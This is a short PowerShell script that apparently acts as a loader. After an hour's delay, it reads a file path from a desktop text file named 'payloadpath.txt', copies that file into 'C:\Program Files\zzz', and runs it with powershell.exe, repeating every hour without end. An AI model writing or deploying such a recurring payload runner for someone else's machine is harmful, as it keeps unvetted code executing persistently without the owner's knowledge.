$filePath = "C:\Users\Sam Muldrow\Desktop\cat\payloadpath.txt"
$directoryPath = "C:\Program Files\zzz"
Write-Host $filename
Start-Sleep -Seconds 3600
$counter = 1
while ($counter) {
	try {
    $payloadpath = Get-Content -Path $filePath -Raw
    Write-Host "File content:"
    Write-Host $payloadpath
	if (Test-Path $directoryPath -PathType Container) {
		Write-Host "Directory already exists at: $directoryPath"
	} else {
		New-Item -ItemType Directory -Path $directoryPath
		Write-Host "Directory created at: $directoryPath"
	}
	$sourceFilePath = $payloadpath
	$lastIndex = $payloadpath.LastIndexOf("\")
	$payloadname = $payloadpath.SubString($lastIndex+1)
	$destinationDirectory = "C:\Program Files\zzz\"+ $payloadname
	try {
		Copy-Item -Path $sourceFilePath -Destination $destinationDirectory -ErrorAction Stop
		Write-Host "File copied successfully to: $destinationDirectory"
		Start-Process powershell.exe -ArgumentList "-File `"$destinationDirectory`""
	} catch {
		Write-Host "Error copying file: $($_.Exception.Message)"
	}
	} catch {
		Write-Host "Error reading file: $($_.Exception.Message)"
	}
    Start-Sleep -Seconds 3600
    $counter++
}
